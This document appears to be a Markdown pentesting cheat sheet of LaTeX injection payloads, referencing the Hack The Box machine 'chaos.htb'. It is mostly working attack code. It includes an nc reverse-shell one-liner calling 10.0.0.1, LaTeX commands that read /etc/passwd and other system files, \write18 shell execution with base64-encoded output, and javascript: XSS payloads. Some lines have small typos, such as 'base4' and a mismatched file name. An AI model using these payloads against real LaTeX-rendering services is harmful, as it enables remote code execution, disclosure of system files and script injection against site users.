# LATeX CMD Injection
LATEX:Latex is weird, but it's turing complete, and it's vulnerable.. 

VM: chaos.htb; there's a pdf page that allows injection

Note: When doing command injection through a web app like chaos, it doesn't like 
      the ampersand '&' input which can be troublesome if you're doing a common
      reverse shell that redirects stderr to stdin

```
$ mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

- just drop the redirect and proceed
$ mkfifo /tmp/f;cat /tmp/f|/bin/sh -i | nc 10.0.0.1 1234 >/tmp/f


## READ FILES 
```
\input{/etc/passwd}
\include{password} # load .tex file
```

## Read single lined file
```
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

## Read multiple lined file
```
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

## Read text file, keep the formatting
```
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

## Write file
```
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```

## Command execution
```
The input of the command will be redirected to stdin, use a temp file to get it.

\immediate\write18{env > output}
\input{output}
```

## If you get any LaTex error, consider using base64 to get the result without bad characters
```
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
\input|ls|base4
\input{|"/bin/hostname"}
```

## Cross Site Scripting
From @EdOverflow
```
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
Live example at http://payontriage.com/xss.php?xss=$\href{javascript:alert(1)}{Frogs%20find%20bugs}$
```

## Links
https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a
https://0day.work/hacking-with-latex/


